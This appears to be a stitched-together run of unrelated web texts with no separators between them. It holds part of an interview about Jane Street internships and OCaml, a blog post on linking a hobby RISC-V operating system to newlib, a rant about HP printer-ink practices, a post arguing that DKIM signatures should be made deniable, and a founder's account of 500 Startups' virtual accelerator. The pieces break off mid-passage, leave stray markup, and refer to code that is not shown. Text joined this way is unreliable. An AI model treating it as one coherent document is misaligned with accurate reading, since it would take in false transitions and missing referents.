<p>So, Harvard also has a functional programming class, but we just have one. That was definitely a good start to spark my interest in functional programming, and Ron also came and gave a short talk on using OCaml in the real world, which was actually pretty cool because that was certainly a question a lot of us had coming into the course. I eventually got to know Jane Street through INSIGHT, which is Jane Street’s program for women in STEM. There are different tracks. So, I did the dev track at INSIGHT and it’s pretty cool because I think it gave you a good sense of what it’s like to work at Jane Street and work with the people at Jane Street. INSIGHT is a week-long program where they bring you to the Jane Street New York office and you go through something like an OCaml bootcamp where you do different exercises to learn about OCaml and get a taste of the kind of work that we do here at Jane Street, and I thought that was really cool. I really enjoyed working with the people at INSIGHT and I felt like I got to see a lot of the culture at Jane Street, which was really exciting. I applied to Jane Street to be an intern last summer and am now back full-time.</p>

<h2 id="000404">00:04:04</h2>

<p>By the way, now that you’re here full-time, have you gotten involved in INSIGHT from the other side?</p>

<h2 id="000410">00:04:10</h2>

<p>Yeah, that’s pretty cool! INSIGHT is during January, so I haven’t quite done it yet, but I will be helping out with INFOCUS and I’ve also helped out with some of the other programs. So, it’s pretty exciting to be on the other side of things because I think these programs are really important and really help spark an interest.</p>

<h2 id="000425">00:04:25</h2>

<p>Right, and when you say these programs, these are like various kinds of outreach programs essentially. INSIGHT is aiming for reaching out to women, there are some that are aimed for trying to get at various non-core schools – we have overrepresented from like a small number of schools where we get a lot of people – and trying to branch out, and there’s some programs we’re working on for underrepresented minorities. So, there’s a bunch of different efforts in different directions there.</p>

<h2 id="000448">00:04:48</h2>

<p>Yeah, yeah, yeah, yeah – really excited to be part of it.</p>

<h2 id="000449">00:04:49</h2>

<p>Great. Matt, how about you?</p>

<h2 id="000451">00:04:51</h2>

<p>Yeah. So, similar to both Jeanne and Grace, I’d done a little bit of functional programming at university, and I guess unlike Jeanne, the cult of OCaml doesn’t stretch quite so widely at Cambridge, but it was certainly something that I had come across and kind of enjoyed, but the main reason I applied for an internship at Jane Street was because a friend of mine, who at the time was a visiting student from MIT, had done the internship the summer before, told me all about it, told me how much fun it was and how interesting it was, and generally just kind of made me want to apply as well, and as it turns out we’re now both full-timers here at Jane Street.</p>

<h2 id="000524">00:05:24</h2>

<div><p>That’s great. </p><p>So, one thing that immediately strikes me from these stories is that you guys are a little unrepresentative in that you’ve all had functional programming experience, and maybe all programmed specifically in OCaml before coming here, whereas I think in reality if you sample incoming interns, a quite solid majority I think haven’t done any functional programming at all, which is actually a pretty big change from what recruiting was like 12 years ago or something where I think at that point we leaned pretty heavily on, “Hey, we program in this interesting functional programming language, so maybe you want to come work here anyway,” and now we have lots of other ways of attracting people, and so the functional programming part is much less of the thing that brings people in the door, and indeed I think people often think to come work here they have to already know OCaml, which is totally not true, and in fact people sometimes think they should interview in OCaml, which is also almost always the wrong idea because there’s really a very small slice of people for whom OCaml is the language that they can best show what they’re good at, and people who choose to use OCaml to please us often discover that it is not a very effective technique. </p><p>Anyway, I was wondering if you guys could say a little bit more about how the internship worked. What’s the basic structure of the internship?</p></div>

<h2 id="000632">00:06:32</h2>

<div><p>Yeah. So, I guess I can talk about it first since it’s perhaps a little bit fresher on my mind than for Jeanne and Matt. </p><p>I interned last summer, and I think I really enjoyed Jane Street’s internship structure actually. I think that was one of the first things that I think I was pretty excited about, which is Jane Street’s dev internship is structured so that you can work on two different teams and oftentimes they are like two teams that are spread across the firm. That was really nice. So, for example, I worked on the larger trading systems team and also post-trade, and I thought that was pretty cool. It kind of gives you a better sense of the firm as a whole and kind of gives you a little bit more exposure there.</p><p> So, I think it was really nice to have been able to intern on two teams, and also the internship is structured, like Ron mentioned before, so that it doesn’t assume that anyone comes in with any OCaml knowledge. So, the first I think week or so of the internship, we did an OCaml Bootcamp, which is a way to help people learn the kinds of tools and the language that we use at Jane Street, which I think is pretty exciting, and it was really cool because, you know, the internship class does it as a whole, and so it was nice to start off your internship with the rest of your class and all go through this together.</p></div>

<h2 id="000808">00:08:08</h2>

<p>That’s a lovely thing about the internship that I think wasn’t clear to me until it just kind of happened is how nice the community of people who come in all at the same time, all knowing nothing about the organization and about the technology, and just come to be friends with each other, and that’s I think been a very positive experience for lots of people over the years.</p>

<h2 id="000823">00:08:23</h2>

<p>For sure. That was a great way to introduce us to each other and build this internship community. I think that’s definitely one of my favorite parts as well because once you finish OCaml Bootcamp, all the interns sit next to their teams and mentors, and so you’re kind of more spread out, but it was really nice – I sat close to a few different interns, and you know, sometimes when you’re super caught up in the code …</p></div></div>

<p>The standard library contains a ton of code that we don’t want to write ourselves, including printf, scanf, math functions, and so forth. So, we need to make sure our operating system can link to this library and everything “just works”. This post will show you how I linked our operating system to a standard library, newlib, and the trials and tribulations encountered in doing so.</p>

<hr>



<h2 id="intro">Introduction</h2>



<p>Libraries allow programmers to start writing programs at a higher level. If anyone remembers back to the 80s where personal computers would boot to a BASIC editor, you essentially had to write your programs from scratch.</p>



<p>The term library just means some place to store code. Generally, this code is an object file of compiled and assembled source code. Shared objects can also be loaded <em>on-demand</em>, but this requires a little bit of extra support from a dynamic linker. See my post about dynamic linking here: <a href="https://blog.stephenmarz.com/2020/06/22/dynamic-linking/" data-type="post" data-id="407">Dynamic Linking</a>.</p>



<hr>



<h2 id="thelibrary">The Library</h2>



<p>Many of the most useful routines will be written once and then stored into either a <em>shared object</em> (so) or an archive (a). We know that libraries allow us to pull in already-written code, but there is a more fundamental reason for a library–to make interfacing with the operating system easy.</p>



<p>If you’ve read my blog posts on a RISC-V operating system using Rust, you will know how an application can make a request from the operating system itself. Generally, this is done through system calls. These system calls are given a number. For example, in Linux on an x86-64 system, system call #0 is the <em>exit</em> system call. However, nothing really says that we have to use these numbers.</p>



<p>If we take a look at libgloss, which is a low-level library written for newlib, we can see the following standard:</p>



<div><figure><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image.png" alt="" width="249" height="380" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image.png 497w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-196x300.png 196w" sizes="(max-width: 249px) 100vw, 249px"><figcaption>libgloss syscall.h file</figcaption></figure></div>



<hr>



<h2 id="syscalls">System Calls</h2>



<p>So, as you can see, the job of a low-level library is to make sure the arguments are in the right location, the system call number is in the correct register, and that the system call is actually made. For RISC-V, the final instruction we execute is <em>ecall</em>, for “environment call”. This instruction will jump us into the operating system. The OS will handle this by first understanding that it is handling a system call. Second, it will look at the system call number and route it to the correct routine.</p>



<p>In my OS blog, you can see I do the same thing here: <a href="https://osblog.stephenmarz.com/ch7.html">https://osblog.stephenmarz.com/ch7.html</a></p>



<p>We can see this in terms of a common function, such as printf(). This function will first use the application to form a full string. So, something like printf(“Hello %s”, “Stephen”) will cause the function to build a string that reads “Hello Stephen\0”. The final step is for printf() to print it to the <em>stdout</em> file handle. Barring any redirections, this is generally the console. So, the library function(s) must eventually call the <em>write</em> system call with the file descriptor (number) listed first, a pointer to the string second, and finally the number of bytes to write third.</p>



<p>At the end of a system call, control is handed back to the user application. In this case, printf() will have to handle whatever return value is received from the write system call. If we perform a system call trace, or strace, we can see that indeed <em>write</em> is the end goal for printf.</p>



<div><figure><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-1-1024x105.png" alt="" width="512" height="53" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-1-1024x105.png 1024w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-1-300x31.png 300w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-1-768x78.png 768w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-1.png 1272w" sizes="(max-width: 512px) 100vw, 512px"></figure></div>



<p>In the output above, we can see that printf() decided to call write with file descriptor 1, which is standard output, the string buffer “Hello Stephen”, which is lastly 13 characters. Notice that printf() must be able to find the NULL-terminator (\0) to count the number of <em>printing</em> characters.</p>



<hr>



<h2 id="our_kernel">Our Kernel</h2>



<p>When we look in our kernel, we have to be able to handle how the library makes the system call. As you can see, most of these system calls follow the UNIX SYSV convention, such as exit, read, write, and so forth, and where everything this a file descriptor, including network sockets and actual files.</p>



<p>The example below shows how I implemented the <em>open</em> system call. You can see that since the application is using virtual memory, I am required to find out where that is in physical memory so the kernel can go find it. Mixing the two or <em>crossing streams</em> is never a good idea.</p>



<div><figure><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-6-1024x613.png" alt="" width="768" height="460" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-6-1024x613.png 1024w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-6-300x180.png 300w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-6-768x460.png 768w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-6.png 1223w" sizes="(max-width: 768px) 100vw, 768px"></figure></div>



<p>In the code above, I check to see if the path given by the user (the first parameter) is somewhere in the virtual file system. If it is, then we can create a new file descriptor and link it to that file. As you can tell, this system call is by no means completely able to handle all of the different types of files out there, including nodes (sockets, fifos, etc).</p>



<hr>



<h2 id="guarantees">Guarantees</h2>



<p>The C++ standard actually contains information about the standard library. This includes complexity guarantees and memory footprints.</p>



<p>The library would also be best to know about all of the exploits of the underlying architecture. For example, strcpy (string copy) can exploit the AVX or SSE extensions if the CPU supports them.</p>



<p>Looking at the C++ 2011 standard, which I found for free here <a href="http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2011/n3242.pdf">http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2011/n3242.pdf</a> outlines the different standard functions that need to be supported to be considered C++ standard.</p>



<p>Here’s just one example of the requirements for the container library on page 717 (731 is the PDF page).</p>



<div><figure><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-7-1024x484.png" alt="" width="768" height="363" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-7-1024x484.png 1024w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-7-300x142.png 300w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-7-768x363.png 768w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-7.png 1338w" sizes="(max-width: 768px) 100vw, 768px"></figure></div>



<hr>



<h2 id="starting_and_ending">Starting and Ending</h2>



<p>Another interesting part of libraries is that some portions of them can help the language function properly. These libraries are usually called <em>runtimes</em>. Most languages now have a runtime, which is code that is executed when the program runs, rather than when it is compiled or linked.</p>



<p>How many of you really knew that <em>int main</em> is not our real entry point for running a program? Instead, this belongs to a memory label called <em>_start</em>. This label is the ELF (executable and linkable format) entry point where the operating system will set your application to start running.</p>



<p>The _start will eventually call int main, but it has to set up some things include command line arguments, or at the very least putting them into the int argc, and char *argv[] parameters.</p>



<p>We can see the _start routines in the crt0.S assembly file, which stands for C-runtime. The 0 is the first runtime, as more runtimes can be added in different files, such as crt1.S and so forth.</p>

<hr>



<p>You can see in the code above, before main is even called, the BSS (uninitialized global variables) is cleared to 0, the global pointer (gp) is set, and the atexit functions (global termination functions) are registered. Finally, argc, argv, and envp all get their proper locations. For RISC-V, this is a0, a1, and a2.</p>



<p>You can see that the last thing to occur is the exit call. This will take the return value of main, which will be in the register a0. The <em>tail</em> instruction means that it will not return. Both call and tail are pseudo-instructions in RISC-V, which can be seen in the RISC-V specification:</p>

<h2 id="dynlink">Handling Dynamic Linking</h2>



<p>Dynamic linking requires us to parse the executable and linkable format (ELF) a little bit more robustly than we did in our <a href="https://osblog.stephenmarz.com/">RISC-V OS in Rust</a>. The dynamic linker requires an executable <em>interpreter</em> that lives somewhere on the storage device. You can actually look at an executable file to see what interpreter it will request when those dynamically-linked functions are called.</p>



<div><figure><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-4-1024x157.png" alt="" width="768" height="118" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-4-1024x157.png 1024w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-4-300x46.png 300w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-4-768x118.png 768w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-4-1536x236.png 1536w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-4.png 1630w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>readelf -l myexec</figcaption></figure></div>



<p>You can see the executable file above is going to use /lib64/ld-linux-x86-64.so.2 to run this simple test executable that I compiled. We can actually run that interpreter and see what it says:</p>



<div><figure><img loading="lazy" src="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-5-1024x347.png" alt="" width="768" height="260" srcset="https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-5-1024x347.png 1024w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-5-300x102.png 300w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-5-768x260.png 768w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-5-1536x521.png 1536w, https://blog.stephenmarz.com/wp-content/uploads/2020/10/image-5.png 1685w" sizes="(max-width: 768px) 100vw, 768px"><figcaption>Invoking the dynamic linker directly</figcaption></figure></div>



<p>As you can see, the INTERP is a particular program header that our operating system would have to be able to handle and spawn a thread to the dynamic linker. However, this was way more than our custom operating system could handle. So now, our operating system will require that the standard library be statically linked into our program. This means that all of the functions and routines that are needed by the program will have to be stored in the executable. This significantly increases the size of our program depending on the number of library function calls made in the lifetime of the executable.</p>

<h2 id="conclusion">Conclusion</h2>



<p>I haven’t even begun to dive deeply at all that goes into designing and creating a library. In my software engineering courses, I show that libraries can be a great tool to aggregate many different teams’ code into a single project. Keep in mind that I’m looking at this with a fairly low-level lens.</p>



<p>Most libraries have a particular architecture and operating system in mind. This leads to some challenges with a custom OS. In fact, more often than not, I ended up copying Linux’s conventions just to avoid pain later. In the grand scheme of things, this might not seem to be a big deal. However, it forces you to think a certain way about an operating system.</p>



<p>Getting a big philosophical–Linux has changed over the years, but it still has a core philosophy. Many operating systems that were derived from it, including Android, are now being rendered obsolete for a new, refreshing look at operating systems. In fact, Google has started the <a href="https://fuchsia.dev/fuchsia-src/get-started">Fuchsia project</a>, which aims to build a modular operating system to replace Android in its mobile devices.</p>

<p>HP never stopped innovating. From its origins in the 1930s as a leading electronics manufacturer to its role in the birth of PCs and performance servers, it has always demonstrated incredible ingenuity.</p>
<p>Today, that ingenuity is deployed in service of evil ink-based fuckery.</p>
<p>The printer-ink business model has always been a form of commercial sadism in which you are expected to put giant manufacturers' interests ahead of your own with no expectation of any sort of reciprocity.</p>
<p><a href="https://www.eff.org/deeplinks/2020/11/ink-stained-wretches-battle-soul-digital-freedom-taking-place-inside-your-printer">https://www.eff.org/deeplinks/2020/11/ink-stained-wretches-battle-soul-digital-freedom-taking-place-inside-your-printer</a></p>
<p>After all, when your profits depend on charging more for ink than vintage Veuve-Clicquot, you need to get up to some serious shenanigans to get your customers to drain their bank accounts to fill their printers.</p>
<p>By contemporary standards, the opening hostilities in the ink-wars look positively quaint:</p>
<ul>
<li>Manufacturing special half-full cartridges to ship with new printers so their owners have to buy a new set just days after the open the box
</li>
<li>
<p>Requiring frequent "calibration" printouts that use vast amounts of ink</p>
</li>
<li>
<p>Gimmicking cartridges' sensors to declare them "empty" even when there's still ink in them</p>
</li>
</ul>
<p>Thing is, all of this just makes official printer ink less desirable and fuels demand for third party ink.</p>
<p>For this to work, you need to win a two-front war: one on your customers and the other on your competitors. HP is fighting both.</p>
<p>First they pioneered the use of DRM to detect and prevent third-party ink.</p>
<p>Then when ink makers started making their own chips, or harvesting chips out of discarded cartridges to use in new ones, HP got US customs to seize the product, calling it a patent infringement.</p>
<p>But the real ugliness started in March 2016, when HP pushed out a fake "security update" for inkjet printers. Owners who ran the update saw nothing, just a software version number that went up by one.</p>
<p>What they didn't know was that they've been given an asymptomatic infection – a malicious update that only kicked in five months later, after everyone had had a good long time to update. That update's real purpose was to detect and reject third party ink.</p>
<p>It went off right after school started, stranding cash-strapped parents with a year's worth of ink for their kids' school projects. People were outraged. HP issued a nonpology.</p>
<p><a href="https://www.eff.org/deeplinks/2016/09/what-hp-must-do-make-amends-its-self-destructing-printers">https://www.eff.org/deeplinks/2016/09/what-hp-must-do-make-amends-its-self-destructing-printers</a></p>
<p>(One year later, they did it again)</p>
<p><a href="https://gizmodo.com/one-year-after-bricking-third-party-ink-with-update-hp-1809073739">https://gizmodo.com/one-year-after-bricking-third-party-ink-with-update-hp-1809073739</a></p>
<p>Every time HP got caught doing something evil, they had the same excuse: "that's the deal we offered and you accepted it."</p>
<p>For example, if the box says "Works best with HP ink," then you are "agreeing" that it might not work with other ink. Nevermind that the only reason your printer doesn't work with other ink is that HP tricked you into downgrading it so that the ink stopped working.</p>
<p>This is the grifter's all-purpose excuse: "If you didn't want me to rip you off, then why did you click 'I agree'?"</p>
<p>HP was just getting started, though. In the ideal world, you wouldn't even own your printer ink, you'd just <em>rent</em> it.</p>
<p>Enter HP Instant Ink.</p>
<p><a href="https://support.hp.com/us-en/document/c03760650">https://support.hp.com/us-en/document/c03760650</a></p>
<p>This  is "ink as a service." You pre-commit to printing a certain number of pages/month and they mail you ink, which they own. You're not buying the ink, you're buying the right to use it.</p>
<p>If you don't print your quota in a month, some of the pages roll over, but they don't let you bank more than a few months' worth – and to keep those pages, you have to keep paying for your sub. Meanwhile, if you blow through your limit, you get charged for every page.</p>
<p>This is a weird and unpalatable idea, so to sell it, HP rolled out a pay-on-price "Free Ink for Life" plan that gave you 15 pages every month for as long as you owned your printer.</p>
<p><img src="https://i0.wp.com/craphound.com/images/s1105906_sc7.jpeg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i0.wp.com/craphound.com/images/s1105906_sc7.jpeg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>But this is HP we're talking about, so words have no meaning. Last month, HP notified its "free ink for life" customers that their life had ended, and they were being moved to a new afterlife where they had to pay $0.99/month, forever, or else.</p>
<p><img src="https://i2.wp.com/craphound.com/images/hpreneges2.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/craphound.com/images/hpreneges2.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<p>This Darth Vader "Pray I don't alter it further" shit is the most on-brand HP thing ever</p>
<p>Worse still are the many imitators HP inspires – all those companies that have decided that it's your solemn duty to arrange your affairs to suit their shareholders' needs.</p>
<p>The right-to-repair criminals like Apple, John Deere and Medtronic. Tesla and GM, Juicero and Keurig – companies that are not merely content with waging war on customers, but also on competitors who offer those customers shelter.</p>
<p>Since the turn of this century, HP has been shedding its productive business units that make useful products, and focusing its legal and engineering departments on innovations in shitty dystopian hack-futurism.</p>

<p>Earlier this week, security researcher Ryan Castellucci published a blog post with a somewhat provocative title: <em><a href="https://rya.nc/dkim-privates.html">DKIM: Show Your Privates</a></em>.</p>



<p>After reading the ensuing discussions on <a href="https://news.ycombinator.com/item?id=24972609">Hacker News</a> and <a href="https://web.archive.org/web/20201104135629/https://old.reddit.com/r/crypto/comments/jmv4qd/dkim_show_your_privates/gb0h87a/?context=9">Reddit</a> about their DKIM post, it seems clear that the importance of <strong>deniability</strong> in online communications seems to have been broadly overlooked.</p>



<h2>Security Goals, Summarized</h2>







<p>When you design or implement any communications protocol, you typically have most or all of the following security goals:</p>



<ul><li><strong>Confidentiality</strong>: Only the intended recipients can understand the contents of a message (almost always achieved through encryption).</li><li><strong>Integrity</strong>: The message will be delivered without alterations; and if it is, the recipient will know to reject it.</li><li><strong>Availability</strong>: Authorized users will have access to the resources they need (i.e. a medium they can communicate through).</li></ul>



<p>However, you may also have one or more of the following security goals:</p>



<ul><li><strong>Authenticity</strong>: In a group communication protocol, you want to ensure you can validate which participant sent each message. This is loosely related to, yet independent from, integrity.</li><li><strong>Non-Repudiation</strong>: An extension of authenticity, wherein you cannot deny that you sent a message after you sent it; it’s provable that you sent it.</li><li><strong>Deniability:</strong> The complement to non-repudiation, wherein you can prove that you sent a message to your recipient, and then at a future time make it possible for other participants to have forged the message.</li></ul>



<p>It’s tempting to think of deniability as the opposite of non-repudiation, but in practice, you want messages to have authenticity for <em>at least</em> a brief period of time for both.</p>



<p>However, you cannot simultaneously have deniability and non-repudiation in a communication. They’re mutually exclusive concepts, even if they both build off authenticity. Hence, I call it a complement.</p>



<p>Off-The-Record messaging achieved deniability through publishing the signing key of the previous message with each additional message.</p>



<h2>Security Properties of DKIM</h2>



<p><a href="https://rya.nc/dkim-privates.html">Ryan Castellucci’s blog post</a> correctly observed that the anti-spam protocol DKIM, as used by most mail providers in 2020, incidentally also offers non-repudiation…even if that’s not <em>supposed to be</em> a primary goal of DKIM.</p>



<p>Non-repudiation can be bolted onto any protocol with long-term asymmetric cryptographic keys used to generate digital signatures of messages–which is exactly what DKIM does.</p>



<h3>Real World Case Study</h3>



<p>A while ago, the New York Post published a DKIM-signed email from someone claiming to be named Vadym Pozharskyi to Hunter Biden–son of the presidential candidate and former Vice President Joe Biden. </p>



<p>Because the DKIM public keys used by Gmail during that time period are known–but <em>not</em> the private keys–it’s possible to authenticate that the emails came from Gmail and is a valid email. And someone <a href="https://github.com/robertdavidgraham/hunter-dkim">did exactly this</a>.</p>



<p>In a similar vein, if someone wanted to embarrass an executive at a large company, accessing their colleagues’ email and leaking messages would be sufficient, since DKIM could be used to verify that the emails are authentic.</p>



<h3>Deniability in DKIM</h3>



<p>Ryan’s proposal for introducing deniability in DKIM was to routinely rotate signing keys and publish fragments of their old DKIM private keys (which are RSA keys) so that anyone can reconstruct the private key after-the-fact.</p>



<p>This kind of deniability is mostly to mitigate against the harm of data leaks–such as your friend’s laptop getting stolen and someone trying to lambaste you on social media for an email you sent 10+ years ago–rather than provide a legal form of deniability. (We’re cryptography nerds, not lawyers.)</p>



<p>If the laptop theft scenario took place, with DKIM, someone can cryptographically <strong>prove</strong> you sent the email at a specific time to your friend with a specific body, because it’s signed by (presumably Gmail’s) DKIM keys.</p>



<p>Conversely, if you had used an email provider that practiced what Ryan proposed (rotating/publishing the private key at a regular interval), they couldn’t cryptographically prove anything. If the past private keys are public, anyone could have come along and forged the DKIM signature.</p>



<h2>On Post-Compromise Security</h2>



<p>The concept of <strong>Post-Compromise Security</strong> is somewhat related to deniability (but affects confidentiality rather than integrity or authenticity):</p>



<p>If someone successfully compromises one participant in a private discussion group, and their access is discovered, can the rest of the participants recover from this breach and continue to have privacy for future conversations?</p>



<p>It’s easy to see how the concepts are related.</p>



<ul><li>Deniability offers short-term authenticity followed by a long-term break in authenticity.</li><li>Post-Compromise Security offers long-term confidentiality even if there’s a short-term break in confidentiality.</li></ul>



<p>Robust private messaging protocols–such as what the IETF is trying to provide with <a href="https://datatracker.ietf.org/doc/draft-ietf-mls-protocol/">Message Layer Security</a>–would ideally offer both properties to their users.</p>



<p>Past attempts to build non-repudiation (through “message franking”) on top of cipher constructions like <a href="https://soatok.blog/2020/05/13/why-aes-gcm-sucks/">AES-GCM</a> led to a class of attacks known affectionately as Invisible Salamanders, based on the title of the <a href="https://eprint.iacr.org/2019/016">relevant research paper</a>.</p>



<h2>In Conclusion</h2>



<figure><div>
<div><blockquote data-width="550" data-dnt="true"><p lang="en" dir="ltr">Apropos of nothing, I really wish Gmail would start publishing its expired DKIM secret keys.</p>— Matthew Green (@matthew_d_green) <a href="https://twitter.com/matthew_d_green/status/1323011619069321216?ref_src=twsrc%5Etfw">November 1, 2020</a></blockquote></div>
</div></figure>



<p>It might seem really weird for cryptographers to want large-scale email providers to publish their expired DKIM secret keys, but when you understand the importance of deniability in past private communications, it’s a straightforward thing to want.</p>



<p>It’s worth noting: Some security experts will push back on this, because they work in computer forensics, and making DKIM deniable would theoretically make their job slightly more difficult. </p>



<p>Keep their self-interest in mind when they’re complaining about this notion, since the proposal is <strong>not</strong> to publish non-expired DKIM secret keys, and therefore it would not make spam more challenging to combat.</p>

                <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>Last Friday (Oct 31, 2020 🎃) we were among the first startups to graduate from 500 Startups’ fully virtual accelerator program.</p>
<!--more-->
<p>I’ve had a lot of people ask me about what 500 Startups is like now that it’s remote, so I figured I’d write about my experience.</p>
<p>If you are considering joining the program yourself or have specific questions, feel free to <a href="mailto:bethany@sendspark.com" target="_self">reach out to me directly</a>.</p>
<h2><strong>What is new about 500 Startups?</strong></h2>
<p>In March 2020, 500 Startups announced two big changes to their model:</p>
<ol type="1">
<li><strong>It’s remote</strong> - so all meetings, programming, social events are now virtual</li>
<li><strong>It’s rolling</strong> - so startups enter and graduate at different times</li>
</ol>
<p>You can read more about why they made these changes on <a href="https://500.co/blog/taking-our-flagship-accelerator-virtual-first/" target="_self">their blog</a>.</p>
<p>When we were considering joining 500 Startups, we had mixed feelings about these changes.</p>
<p>They clearly offer a lot more flexibility to the startups. We could time the program and our Demo Day for when it made the most sense for our business and we did not have to relocate ourselves from San Antonio, Texas, to San Francisco.</p>
<p>However, we also worried about “missing out” on social components. There is something to be said for dropping ~70 founders building companies in the same room for four months, and letting organic relationships blossom.</p>
<h2><strong>Our goals for Sendspark</strong></h2>
<p>For context, this is where our heads were at when we were making the decision to join 500 Startups:</p>
<p>It was late May 2020. The COVID-19 pandemic wasn’t exactly new, but it was just starting to sink in that it wasn’t temporary. Businesses were just starting to update their strategies to take into account that they would be working remote for the foreseeable future.</p>
<p>Meanwhile, we were an early-stage video company that wanted to help!</p>
<p>Sendspark is a video messaging platform that helps businesses engage customers with personalized video messages. Users can easily <a href="https://www.sendspark.com/video-platform/record-videos" target="_self">record videos</a> from their web browser to share with customers in email, LinkedIn messages, website chatbots, or any other professional communication channel. Users can also <a href="https://www.sendspark.com/video-platform/request-videos" target="_self">request videos</a> from customers to get feedback, support issues, or customer testimonials.</p>
<p>We saw that we could help sales, marketing, and support teams bridge the gap to connect with customers online.</p>
<p>But, we were just barely too early to take advantage of the situation. We were missing key product features (like screen recording 🤦‍♀️), nearly all of our network was in San Antonio, Texas, and we did not have the capital to just “give everything away for free to gain market share” like some of our competitors.</p>
<p>And then we received <a href="https://share.sendspark.com/view/jahgk4ffvz3hwre5" target="_blank" rel="noopener">this video email</a> from the 500 Startups team...</p>
<p><a href="https://share.sendspark.com/view/jahgk4ffvz3hwre5" rel="noopener" target="_blank"><img src="https://blog.sendspark.com/hs-fs/hubfs/500%20Startups%20Acceptance%20Email.gif?width=704&amp;name=500%20Startups%20Acceptance%20Email.gif" alt="500 Startups Acceptance Email" width="704" srcset="https://blog.sendspark.com/hs-fs/hubfs/500%20Startups%20Acceptance%20Email.gif?width=352&amp;name=500%20Startups%20Acceptance%20Email.gif 352w, https://blog.sendspark.com/hs-fs/hubfs/500%20Startups%20Acceptance%20Email.gif?width=704&amp;name=500%20Startups%20Acceptance%20Email.gif 704w, https://blog.sendspark.com/hs-fs/hubfs/500%20Startups%20Acceptance%20Email.gif?width=1056&amp;name=500%20Startups%20Acceptance%20Email.gif 1056w, https://blog.sendspark.com/hs-fs/hubfs/500%20Startups%20Acceptance%20Email.gif?width=1408&amp;name=500%20Startups%20Acceptance%20Email.gif 1408w, https://blog.sendspark.com/hs-fs/hubfs/500%20Startups%20Acceptance%20Email.gif?width=1760&amp;name=500%20Startups%20Acceptance%20Email.gif 1760w, https://blog.sendspark.com/hs-fs/hubfs/500%20Startups%20Acceptance%20Email.gif?width=2112&amp;name=500%20Startups%20Acceptance%20Email.gif 2112w" sizes="(max-width: 704px) 100vw, 704px"></a>So, we decided that if 500 Startups was willing to make a bet on us, then we’d take a bet on them and their new virtual accelerator modal.</p>
<p>These were goals we discussed as a team as we started onboarding:</p>
<ol type="1">
<li><strong>Complete the team </strong>- make sure we were capable of iterating fast to stay ahead of the quickly-changing market</li>
<li><strong>Complete the product </strong>- build a super sticky product that people LOVED</li>
<li><strong>Grow market share</strong> - make sure that Sendspark was the #1 choice for businesses when they looked for video tools for customer communication</li>
<li><strong>Expand our network</strong> - meet thought leaders and work with the best customers, mentors, and investors, wherever they were in the world</li>
<li><strong>Raise Seed funding</strong> - So that we could afford to hire the best team, build the best product, and reach the best customers.</li>
</ol>
<h2><strong>The 500 Startups Virtual Experience </strong></h2>
<p>The theme of 500 Startups’ new remote, rolling model is that they personalize the experience for each of their startups.</p>
<p>This is what programming looked like for us:</p>
<h3><strong>500 Startups Required Programming:</strong></h3>
<ul>
<li><strong>Weekly standup (~1 hr / wk)</strong> - every Tuesday, we’d have a standup with all founders in-program to share what we’re working on, and make asks to other people in the batch. These meetings were great for learning from other founders and exchanging advice.</li>
<li><strong>Investment lead meetings (~1hr / wk) </strong>- every Friday, we’d meet with our investment lead to update her on our progress, make sure we were staying true to our goals, and get her feedback on how we could progress faster.</li>
<li><strong>EIR meetings (~1.5hrs / wk)</strong> - twice a week, we’d meet with our EIR (entrepreneur in residence), who would work with us to build an incredibly personalized growth plan. We hand selected our EIR at the beginning of 500 Startups to find one with experience in our industry, and building product-led growth companies. These meetings were critical for learning new ways to grow, and keeping us honest that we were running growth experiments.</li>
<li><strong>Written investor updates (~30 min / wk)</strong> - Every Friday (or Saturday, or Sunday, depending on how busy the week was), we’d send a short investor update to the 500 Startups investment team, and other investors in Sendspark through <a href="https://www.visible.vc/" target="_blank" rel="noopener">Visible.vc</a>. This was a quick way to keep everyone up to state, and keep track of our progress.</li>
</ul>
<h3><strong>Optional Programming:</strong></h3>
<ul>
<li><strong>Guest speakers &amp; webinars (~1-4 hrs per wk)</strong> - there were usually around 4 webinars per week with guest speakers. We were encouraged to only attend the ones that were relevant to us. I usually attended one of the four per week, or would watch while I ate lunch or took a break from work.</li>
